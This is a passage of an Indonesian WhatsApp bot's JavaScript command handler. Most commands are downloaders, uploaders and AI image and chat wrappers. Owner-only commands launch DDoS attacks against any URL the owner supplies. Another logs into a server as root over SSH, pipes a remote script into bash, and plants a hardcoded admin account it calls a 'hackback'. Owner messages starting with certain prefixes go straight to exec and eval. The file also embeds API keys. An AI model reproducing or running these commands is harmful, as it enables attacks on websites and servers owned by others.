        m.reply("Ups, terjadi kesalahan saat mengambil informasi gempa. Coba lagi nanti!");
    }
}
break;
			case 'rules': {
  const cap = `┏━━━°❀ ❬ *Rules Gamma-bot* ❭ ❀°━━━┓

1. ✧ *Dilarang Melakukan Spam Kepada Bot*, Jika Ketahuan Akan Di Banned.

2. ✧ Jika Bot Tidak Menjawab 1x, Silahkan Dicoba Lagi. Tapi Jika Bot Tidak Menjawab 2x, Itu Artinya Delay, Jangan Dipakai Dulu.

3. ✧ *Jangan Spam Bot, Kalau Belum Donasi, Sadar Diri Aja Makenya* :)

4. ✧ Jika Limit Habis, Silahkan Bermain Game Untuk Mendapatkan Exp. Contoh Game: Tebak-Tebakan, RPG Game, dll.

5. ✧ *Dilarang Mengirim Virtex/Bug Ke Bot*, Walaupun Tidak Ada Efeknya :v

6. ✧ *Dilarang Keras Menelpon Bot*, Jika Menelpon Akan Otomatis Diblokir.

7. ✧ Jika Tidak Mengerti Cara Menggunakan Bot, Silahkan Bertanya Pada Member Lain. Atau Jika Belum Join Group Bot, Ketik #gcbot Dan Masuk Group Bot.

8. ✧ Jika Ada Fitur Error/Tidak Mengerti Cara Menggunakannya, Silahkan Laporkan/Tanyakan Kepada Owner.

9. ✧ Jika Bot Delay, Jangan Di Spam Terlebih Dahulu.

10. ✧ Untuk User *Premium*, *Dilarang Keras Mengirim Bug Asal Ke Orang Lain*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
reply(cap)
}
break
case 'antipromosi': {
if (!isGroup) return reply(`khusus grup!`)
if (!isAdmins) return reply(`Khusus admin!`)
if (!isBotAdmin) return reply(`Botnya Jadiin admin dulu`)
if (args[0] === "on") {
global.owneroff = false
reply('Berhasil Mengganti Anti Promosi Ke Mode *ON*')
} else if (args[0] === "off") {
global.owneroff = true
reply('Berhasil Mengganti Anti Promosi Ke Mode *Off*')
} else {
reply(`Contoh: ${prefix+command} on/off`)
}}
break			
case 'venice': case 'veniceai': {
if (!text) return m.reply('Contoh: .venice apa itu AI?');
client.sendMessage(m.chat, { react: { text: '💗', key: m.key }});
try {
const axios = require('axios');
const { data } = await axios.request({
method: 'POST',
url: 'https://outerface.venice.ai/api/inference/chat',
headers: {
accept: '*/*',
'content-type': 'application/json',
origin: 'https://venice.ai',
referer: 'https://venice.ai/',
'user-agent': 'Mozilla/5.0 (Android 10; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0',
'x-venice-version': 'interface@20250523.214528+393d253'
},
data: JSON.stringify({
requestId: 'nekorinn',
modelId: 'dolphin-3.0-mistral-24b',
prompt: [
{
content: text,
role: 'user'
}
],
systemPrompt: '',
conversationType: 'text',
temperature: 0.8,
webEnabled: true,
topP: 0.9,
isCharacter: false,
clientProcessingTime: 15
})
});
const chunks = data.split('\n').filter(v => v).map(v => JSON.parse(v));
const hasil = chunks.map(v => v.content).join('');
client.sendMessage(m.chat, { text: hasil }, { quoted: m });
} catch (e) {
console.error(e.message);
client.sendMessage(m.chat, { text: 'Maaf, tidak ada hasil dari Venice.' }, { quoted: m });
}
}
break
case "crypto": case "infocrypto": {
if (text) {
const pair = text.toLowerCase()
const url = `https://indodax.com/api/summaries`;
    const response = await axios.get(url);
    const data = response.data.tickers[pair]
    if (!data) return m.reply("ID Coin tidak ditemukan!")
return reply(`
📈 Nama : *${data.name}*
🛒 Harga Buka : *Rp${Number(data.low).toLocaleString('id-ID')}*
🔒 Harga Tutup : *Rp${Number(data.high).toLocaleString('id-ID')}*
💰 Harga Saat Ini : *Rp${Number(data.last).toLocaleString('id-ID')}*
`)
}
try {
    const url = `https://indodax.com/api/summaries`;
    const response = await axios.get(url);
    const data = response.data.tickers;
    let teks = ""

    for (const [pair, info] of Object.entries(data)) {
      teks += `\n📈 Nama : *${info.name}* 
📎 ID : *${pair}*
💰 Harga : *Rp${Number(info.last).toLocaleString('id-ID')}*\n`
    }
    return reply(teks)

  } catch (error) {
    console.log('Gagal mengambil semua harga dari Indodax: ${error.message}');
  }
}
break
case 'snackvideo':{
 const cheerio = require('cheerio');
if (!text) return reply(`Linknya mana??`)
async function downloadSnackVideo(url) {
 return new Promise(async (resolve, reject) => {
 try {
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 let result = {
 metadata: {},
 download: null
 };
 const json = JSON.parse($("#VideoObject").text().trim());
 result.metadata.title = json.name;
 result.metadata.thumbnail = json.thumbnailUrl[0];
 result.metadata.uploaded = new Date(json.uploadDate).toLocaleString();
 result.metadata.comment = json.commentCount;
 result.metadata.watch = json.interactionStatistic[0].userInteractionCount;
 result.metadata.likes = json.interactionStatistic[1].userInteractionCount;
 result.metadata.share = json.interactionStatistic[2].userInteractionCount;
 result.metadata.author = json.creator.mainEntity.name;
 result.download = json.contentUrl;
 resolve(result);
 } catch (error) {
 reject({ msg: error.message });
 }
 });
}
try {
const result = await downloadSnackVideo(text);
let message = `🎥 Nihh hasil download darii SnackVideo kamuu !! 🎉

✨ Judul Video : ${result.metadata.title} ✨
👀 Jumlah Tonton : ${result.metadata.watch} 👀
👤 Darii : ${result.metadata.author} 👤`

client.sendMessage(m.chat,{
video : { url : result.download },
caption : message
 })
} catch (err) {
console.error(err);
Reply("Error :(")}
}
break
case 'mode': {
let mode = `𝘽𝙤𝙩 𝙉𝙮𝙖 𝙈𝙖𝙪 𝘿𝙞 𝙈𝙤𝙙𝙚 𝘼𝙥𝙖 𝙉𝙞𝙝 𝙆𝙞𝙣𝙜`
await client.sendMessage(m.chat, {
  footer: `Klik Tombol ini`,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'List Menu',
          sections: [
            {
              title: 'List Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'MODE SAD (MODE SELF)',
                  id: '.self'
                },                
                {
                  title: 'MODE HAPPY (MODE PUBLIC)',
                  id: '.public'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: global.namabot,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: mode,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.chjid + "@newsletter",
   newsletterName: `𝕮𝖗𝖊𝖆𝖙𝖊𝖉 𝕭𝖞 𝕯𝖎𝖐𝖆𝖙𝖔𝖐𝖎`,
   },   
    externalAdReply: {
      title: global.namabot,
      body: ucapanWaktu,
      thumbnailUrl: global.imageurl,
      sourceUrl: global.ucch,
      mediaType: 1,
      renderLargerThumbnail: true,
    },
  },
})
}
break
//Create By Dafa

case 'getcode':
case 'ambilcode':
case 'curicode':
case 'getwebcode': {
  if (!isOwner) return Xowner();
  if (!text) return m.reply(`Contoh: .getcode https://example.com NamaFile`);

  const [url, namaFile = 'website_dump'] = text.trim().split(/\s+/);
  if (!/^https?:\/\//.test(url)) return m.reply('❌ URL tidak valid.');
  const fetch = require('node-fetch'), cheerio = require('cheerio'), fs = require('fs'), path = require('path');
  const AdmZip = require('adm-zip'), { pipeline } = require('stream/promises'), { createWriteStream } = fs;

  const sleep = ms => new Promise(r => setTimeout(r, ms));
  const zipName = namaFile.replace(/[^a-z0-9_-]/gi, '_');
  const tmpDir = path.join(__dirname, `./start/tmp/${zipName}`);
  const zipPath = path.join(__dirname, `./start/tmp/${zipName}.zip`);
  fs.rmSync(tmpDir, { recursive: true, force: true }); fs.mkdirSync(tmpDir, { recursive: true });

  try {
    m.reply('⏳ Membuka halaman...');
    const res = await fetch(url);
    if (!res.ok) return m.reply('❌ Gagal mengakses halaman');
    const html = await res.text(), $ = cheerio.load(html), base = new URL(url);

    const summary = {
      title: $('title').text() || '-', desc: $('meta[name="description"]').attr('content') || '-',
      h1: $('h1').map((_, el) => $(el).text().trim()).get(),
      h2: $('h2').map((_, el) => $(el).text().trim()).get(),
      h3: $('h3').map((_, el) => $(el).text().trim()).get(),
      p: $('p').map((_, el) => $(el).text().trim()).get().filter(t => t.length > 50).slice(0, 5),
      media: {
        img: $('img[src]').length, video: $('video[src], source[src]').length,
        audio: $('audio[src], source[src]').length, link: $('a[href]').length
      }
    };

    const preview = `🌐 *Web Preview*\n📌 *Judul*: ${summary.title}\n📝 *Deskripsi*: ${summary.desc}\n\n` +
      summary.h1.map(t => `- H1: ${t}`).join('\n') + '\n' +
      summary.h2.map(t => `- H2: ${t}`).join('\n') + '\n' +
      summary.h3.map(t => `- H3: ${t}`).join('\n') + '\n\n' +
      `🧾 *Paragraf Penting*:\n${summary.p.map((p, i) => `${i + 1}. ${p}`).join('\n') || '-'}` +
      `\n\n🖼️ *Media*:\n- Gambar: ${summary.media.img}\n- Video: ${summary.media.video}\n- Audio: ${summary.media.audio}\n- Link: ${summary.media.link}`;

    await m.reply(preview);
    await m.reply('📥 Mengunduh aset...');

    const links = new Set();
    $('link[href], script[src], img[src], video[src], audio[src], source[src], iframe[src], object[data]')
      .each((_, el) => {
        const src = $(el).attr('href') || $(el).attr('src') || $(el).attr('data');
        try { if (src) links.add(new URL(src, base).href); } catch { }
      });

    const fileMap = {};
    const download = async (link, retry = 3) => {
      try {
        const u = new URL(link);
        let fPath = decodeURIComponent(u.pathname);
        if (fPath.endsWith('/')) fPath += 'index.html';
        const saveTo = path.join(tmpDir, fPath);
        fs.mkdirSync(path.dirname(saveTo), { recursive: true });
        const r = await fetch(link); if (!r.ok || !r.body) throw 0;
        const ext = path.extname(fPath).toLowerCase();
        const type = ext.includes('.js') ? 'JS' : ext.includes('.css') ? 'CSS' :
          ext.includes('.html') ? 'HTML' : ext.match(/\.(png|jpe?g|gif|svg|webp)/) ? 'IMG' :
          ext.match(/\.(mp4|webm|ogg)/) ? 'Video' : ext.match(/\.(mp3|wav|ogg)/) ? 'Audio' : 'Other';
        (fileMap[type] ||= []).push(fPath.slice(1));
        await pipeline(r.body, createWriteStream(saveTo));
      } catch (e) { if (retry) await download(link, retry - 1); }
    };

    for (const l of links) await download(l);
    fs.writeFileSync(path.join(tmpDir, 'index.html'), html);

    const info = [`📄 Dump: ${url}`, '', '=== File ==='];
    for (const t in fileMap) info.push(`📂 ${t} (${fileMap[t].length})`, ...fileMap[t].map(f => ` - ${f}`), '');
    fs.writeFileSync(path.join(tmpDir, 'README.txt'), info.join('\n'));

    const zip = new AdmZip(); zip.addLocalFolder(tmpDir); zip.writeZip(zipPath);
    await client.sendMessage(m.chat, {
      document: fs.readFileSync(zipPath),
      mimetype: 'application/zip',
      fileName: `${zipName}.zip`
    }, { quoted: m });

    fs.rmSync(tmpDir, { recursive: true, force: true });
    fs.unlinkSync(zipPath);

  } catch (e) {
    console.error(e);
    m.reply('❌ Error:\n' + e.message);
  }
}
break
case 'ddos-hent': {
if (!isOwner) return reply(`Khusus Owner`)
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
m.reply(`Serangan DDoS telah dieksekusi ke situs web yang dituju:\n\nTarget: ${text}\nTime: 60\nThread: 20\nRate: 100`);
exec(`node ./lib/hent.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break

case 'ddos-mix': {
if (!isOwner) return reply(`Khusus Owner`)
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
m.reply(`Serangan DDoS telah dieksekusi ke situs web yang dituju:\n\nTarget: ${text}\nTime: 60\nThread: 20\nRate: 100`);
exec(`node ./lib/mix.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break
case 'jadibot': {
if (m.key.fromMe) return
jadibot(client, m, m.chat)
}
break
case 'stopjadibot': {
if (m.key.fromMe) return
stopjadibot(client, m, m.chat)
}
break
case "listbot": case 'listjadibot': {
if (!isOwner && !isPremium) return reply(mess.premium)
if (m.key.fromMe) return
listjadibot(client, m)
}
break
case 'clearsesi': 
  case 'clearsession': {
fs.readdir("session", async function (err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
console.log(filteredArray.length); 
let teks =`Terdeteksi ${filteredArray.length} file sampah\n\n`
if(filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
reply(teks) 
await sleep(2000)
reply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
reply("Berhasil menghapus semua kenangan Mantan")     
});
}
break
case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
loading()
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await client.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break
case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
loading()
var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await client.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break
case "hbpanel": case "hackbackpanel": {
if (!isOwner) return reply(mess.only.owner)
let t = text.split('|')
if (t.length < 2) return reply(".hbpanel ipvps|pwvps")

let ipvps = t[0]
let passwd = t[1]

const newuser = "adminDika"
const newpw = "01"

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const client = new Client();

client.on('ready', () => {
client.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await client.sendMessage(m.chat, {text: teks}, {quoted: m})
client.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case 'mediafire': case 'mf': {
  if (!q) return reply('Masukkan link Mediafire-nya!\nContoh: .mediafire https://www.mediafire.com/file/xxx')
loading()

  try {
    const res = await fetch(`https://api.siputzx.my.id/api/d/mediafire?url=${encodeURIComponent(q)}`)
    const json = await res.json()
    if (!json.status) return m.reply('Gagal mengambil data dari Mediafire.')
    const {
      fileName,
      fileSize,
      fileType,
      mimeType,
      fileExtension,
      uploadDate,
      compatibility,
      description,
      downloadLink
    } = json.data
    let caption = `*「 MEDIAFIRE DOWNLOADER 」*\n\n`
    caption += `*Nama File:* ${fileName}\n`
    caption += `*Ukuran:* ${fileSize}\n`
    caption += `*Tipe:* ${fileType} (${fileExtension})\n`
    caption += `*Mime:* ${mimeType}\n`
    caption += `*Kompatibilitas:* ${compatibility}\n`
    caption += `*Upload Date:* ${uploadDate}\n`
    caption += `*Deskripsi:* ${description}`
    await client.sendMessage(m.chat, {
      document: { url: downloadLink },
      fileName,
      mimetype: mimeType,
      caption
    }, { quoted: m })
  } catch (err) {
    console.error(err)
    m.reply('Terjadi kesalahan saat memproses link.')
  }
  }
  break
case 'mediafire2': case 'mf2': {
  if (!q) return reply(`Kirim link Mediafire-nya!\n\nContoh: ${prefix + command} https://www.mediafire.com/file/xxx`)
loading()
  try {
    let res = await fetch(`https://api.vreden.my.id/api/mediafiredl?url=${q}`)
    let data = await res.json()
    if (!data.result || !data.result[0].status) return m.reply('Gagal mengambil data Mediafire.')
    let file = data.result[0]
    let { nama, size, link } = ffil
    let ext = nama.split('.').pop().toLowerCase()
    let mimeTypes = {
      zip: 'application/zip',
      pdf: 'application/pdf',
      mp4: 'video/mp4',
      mp3: 'audio/mpeg',
      apk: 'application/vnd.android.package-archive',
      docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
      xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
      pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
      txt: 'text/plain',
      png: 'image/png',
      jpg: 'image/jpeg',
      jpeg: 'image/jpeg',
    }
    let mime = mimeTypes[ext] || 'application/octet-stream'
    let caption = `*MEDIAFIRE DOWNLOADER*\n\n`
    caption += `*Nama:* ${nama}\n`
    caption += `*Ukuran:* ${size}\n`
    caption += `*Tipe:* ${mime}\n`
    caption += `*Server:* ${file.server}\n`
    caption += `*Link:* ${link}\n\n`
    caption += `_Jika file tidak bisa dibuka langsung, silakan buka dari File Manager._`
    await client.sendMessage(m.chat, {
      document: { url: link },
      fileName: nama,
      mimetype: mime,
      caption
    }, { quoted: m })
  } catch (e) {
    console.log(e)
    m.reply('Terjadi kesalahan saat mengambil file, coba lagi nanti.')
  }
}
  break
case 'tourl': {
    const fs = require('fs');
    const path = require('path');
    const axios = require('axios');
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');
    const q = m.quoted || m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!mimetype) {
        return client.sendMessage(m.chat, {
            text: `Kirim file media dengan caption *${command}*`,
        }, { quoted: m });
    }
    const media = await q.download();
    const tempDir = './start/tmp';
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
    const fileName = `media_${Date.now()}${path.extname(mimetype)}`;
    const filePath = path.join(tempDir, fileName);
    fs.writeFileSync(filePath, media);
    const buffer = fs.readFileSync(filePath);
loading()
    async function uploadToSupa(buffer) {
        try {
            const form = new FormData();
            form.append('file', buffer, 'upload.jpg');
            const res = await axios.post('https://i.supa.codes/api/upload', form, {
                headers: form.getHeaders()
            });
            return res.data?.link || null;
        } catch (error) {
            console.error('Supa Upload Error:', error?.response?.data || error.message);
            return null;
        }
    }

    async function uploadToTmpFiles(filePath) {
        try {
            const buffer = fs.readFileSync(filePath);
            const { ext, mime } = await fromBuffer(buffer);
            const form = new FormData();
            form.append('file', buffer, {
                filename: `${Date.now()}.${ext}`,
                contentType: mime
            });
            const res = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
                headers: form.getHeaders()
            });
            return res.data.data.url.replace('s.org/', 's.org/dl/');
        } catch (error) {
            console.error('TmpFiles Error:', error);
            return null;
        }
    }

    async function uploadToUguu(filePath) {
        try {
            const form = new FormData();
            form.append('files[]', fs.createReadStream(filePath));
            const res = await axios.post('https://uguu.se/upload.php', form, {
                headers: form.getHeaders()
            });
            return res.data.files?.[0]?.url || null;
        } catch (error) {
            console.error('Uguu Upload Error:', error);
            return null;
        }
    }

    async function uploadToFreeImageHost(buffer) {
        try {
            const form = new FormData();
            form.append('source', buffer, 'file');
            const res = await axios.post('https://freeimage.host/api/1/upload', form, {
                params: {
                    key: '6d207e02198a847aa98d0a2a901485a5' 
                },
                headers: form.getHeaders()
            });
            return res.data.image.url;
        } catch (error) {
            console.error('FreeImage.Host Error:', error?.response?.data || error.message);
            return null;
        }
    }

    const [
        supaLink,
        tmpLink,
        uguuLink,
        freeImageHostLink
    ] = await Promise.all([
        uploadToSupa(buffer),
        uploadToTmpFiles(filePath),
        uploadToUguu(filePath),
        uploadToFreeImageHost(buffer),
    ]);
    let msg = `*✅ Upload berhasil ke beberapa layanan:*\n`;
    if (supaLink) msg += `\n🔗 *Supa:* ${supaLink}`;
    if (tmpLink) msg += `\n🔗 *TmpFiles:* ${tmpLink}`;
    if (uguuLink) msg += `\n🔗 *Uguu:* ${uguuLink}`;
    if (freeImageHostLink) msg += `\n🔗 *FreeImage.Host:* ${freeImageHostLink}`;
    await client.sendMessage(m.chat, { text: msg }, { quoted: m });
    fs.unlinkSync(filePath);
}
break
case 'ghibli': {
   if (!text) return reply('📸 Mana link nya? Ketik prompt gambar nya dulu dong 😎')

   const data = {
      prompt: text,
      style: "Howl's Castle"
   }

   try {
      const res = await axios.post(
         'https://ghibliimagegenerator.net/api/generate-image',
         data,
         {
            headers: {
               'accept': '*/*',
               'content-type': 'application/json'
            }
         }
      )

      const base64 = res.data.imageData.split(',')[1]
      const buffer = Buffer.from(base64, 'base64')

      client.sendMessage(
         m.chat,
         {
            image: buffer,
            caption: '✨ Ini dia hasilnya, Kak! Semoga suka ya 🏞️'
         }
      )
   } catch (e) {
      const detail = e.response?.data || e.message
      reply('❌ Gagal generate gambar : ' + JSON.stringify(detail, null, 2))
   }
}
break;
case 'tourl2': {
    const fetch = require('node-fetch');
    const FormData = require('form-data');
    const q = m.quoted ? m.quoted : m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!/webp/.test(mimetype)) {
        loading()
        try {
            const media = await q.download?.();
            const fileSizeInBytes = media.length;
            const fileSizeInKB = (fileSizeInBytes / 1024).toFixed(2);
            const fileSizeInMB = (fileSizeInBytes / (1024 * 1024)).toFixed(2);
            const fileSize = fileSizeInMB >= 1 ? `${fileSizeInMB} MB` : `${fileSizeInKB} KB`;
            const form = new FormData();
            form.append('reqtype', 'fileupload');
            let ext = mimetype.split('/')[1] || '';
            if (ext) ext = `.${ext}`;
            form.append('fileToUpload', media, `file${ext}`);
            const res = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: form
            });
            const result = await res.text();
            const url = result.trim();
            const caption = `🔗 URL: ${url}\n\n*Ukuran:* ${fileSize}`;
            reply(caption)
        } catch (e) {
            console.error(e);
            reply(`[ ! ] Gagal mengunggah file. Error: ${e.message}`);
        }
    } else {
        reply(`File *.webp* tidak didukung. Kirim atau reply file lain dengan caption *${usedPrefix + command}*`);
    }
};
break
case 'simiai':
case 'simi': {
  if (!text) return reply(`apaan manggil manggil..`)
const url = `https://endpoint.web.id/ai/simsimi?key=simi&query=Kamu adalah simi, memiliki sifat nyebelin dan kasar, serta gak banyak basa basi langsung jawab singkat dan langsung ke intinya, serta gunakan kata kata gaul seperti lu dan gua&text=${encodeURIComponent(text)}`;
    const data = await fetchJson(url);
    const response = data.result.response;
    reply(response);
}
break 
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${command} kamujelek|tapii boong`)
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
break 
case 'toanime': case 'jadianime': {
const WS_URL = "wss://pixnova.ai/demo-photo2anime/queue/join";
const IMAGE_URL = "https://oss-global.pixnova.ai/";
const SESSION = crypto.randomBytes(5).toString("hex").slice(0, 9);
let wss;
let promise;

function _connect(log) {
  return new Promise((resolve, reject) => {
    wss = new Websocket(WS_URL);
    wss.on("open", () => {
      console.log("[ INFO ] Koneksi ke websocket tersambung.");
      resolve();
    })

    wss.on("error", (error) => {
      console.error("[ ERROR ] " + error);
      reject(error);
    })

    wss.on("message", (chunk) => {
      const data = JSON.parse(chunk.toString());
      if (promise && promise.once) {
        promise.call(data)
        promise = null;
      } else if (promise && !promise.once) {
        if (log) console.log(data);
        if (data?.code && data.code == 200 && data?.success && data.success == true) {
          let amba = data;
          amba.output.result.forEach((_, i) => {
            amba.output.result[i] = IMAGE_URL + amba.output.result[i]
          })
          promise.call(amba);
          promise = null;
        }
      }
    })
  })
}

function _send(payload, pr) {
  return new Promise(resolve => {
    wss.send(JSON.stringify(payload));
    if (pr) {
      promise = {
        once: true,
        call: resolve
      }
    } else {
      promise = {
        once: false,
        call: resolve
      }
    }
  })
}

async function PixNova(data, image, log) {
  let base64Image;
  if (/https\:\/\/|http\:\/\//i.test(image)) {
    const gs = await fetch(image);
    const kb = await gs.arrayBuffer();
    base64Image = Buffer.from(kb).toString("base64");
  } else if (Buffer.isBuffer(image)) {
    base64Image = image.toString("base64");
  } else {
    base64Image = image;
  }
  await _connect(log);
  let payload = {
    session_hash: SESSION
  }
  const resp = await _send(payload, true);
  if (log) console.log(`[ ${SESSION} ] Hash: ${JSON.stringify(resp, null, 2)}`);
  payload = {
    "data": {
      "source_image": `data:image/jpeg;base64,${base64Image}`,
      "strength": data?.strength || 0.6,
      "prompt": data.prompt,
      "negative_prompt": data.negative,
      "request_from": 2
    }
  }
  const out = await _send(payload, false);
  return out;
}
async function pomf2(filePath) {
    try {
        if (!fs.existsSync(filePath)) throw new Error("File tidak ditemukan");
        const contentType = mime.lookup(filePath) || "application/octet-stream";
        const fileName = path.basename(filePath);
        const ext = path.extname(filePath).toLowerCase();
        const form = new FormData();
        form.append("files[]", fs.createReadStream(filePath), {
            contentType,
            filename: fileName, // Paksa nama file tetap JPG
        });
        const response = await axios.post("https://qu.ax/upload.php", form, {
            headers: {
                ...form.getHeaders(),
            },
        });

        // Cek hasil
        if (!response.data.success || !response.data.files?.length) throw new Error("Upload gagal");
        
        return response.data.files[0].url;
    } catch (err) {
        console.error("Error:", err.message);
        return null;
    }
}
  const media = await client.downloadAndSaveMediaMessage(quoted)
  const IMAGE = await pomf2(media)
  console.log(IMAGE)
  const LOGGER = true; // Menampilkan teks ke console selama proses
  const DATA = {
    prompt: "(masterpiece), best quality",
    negative: "(worst quality, low quality:1.4), (greyscale, monochrome:1.1), cropped, lowres , username, blurry, trademark, watermark, title, multiple view, Reference sheet, curvy, plump, fat, strabismus, clothing cutout, side slit,worst hand, (ugly face:1.2), extra leg, extra arm, bad foot, text, name",
    strength: 0.6
  }

  const result = await PixNova(DATA, IMAGE, LOGGER) // Buffer, Base64 atau url
  client.sendMessage(m.chat, { image: { url: result.output.result }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
  console.log(JSON.stringify(result, null, 2))
}
break
case 'gptimg': {
if (!isPremium) return reply(mess.premium)
if (!text) return reply('Promt Nya Bos...')
loading()
    try {
 client.sendMessage(m.chat, { image: { url: `https://imgen.duck.mom/prompt/${encodeURIComponent(text)}`}, caption: `_Sukses Membuat ${command} Dengan Promt:\n${text}_`}, { quoted: m})
    } catch (error) {
reply('eror')
    }
}
break
case 'ocr': {
  if (!/image/.test(mime)) return reply(`mana fotonya kak?`)
  loading()
  const media = await client.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
	const data = await fetchJson(`https://api.alyachan.dev/api/ocr?image=${anuu.url}&apikey=MeliodasIDgembul`)
	const textnya = data.data.text
	reply(`${textnya}`)
}
break



//Batas Case
            default:
}
 if (budy.startsWith('$')) {
                    if (!isOwner) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply("\n" + stdout);
                    });
                }
                
                if (budy.startsWith('^')) {
                    if (!isOwner) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        
                if (budy.startsWith('>')) {
                    if (!isOwner) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};
              
  
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
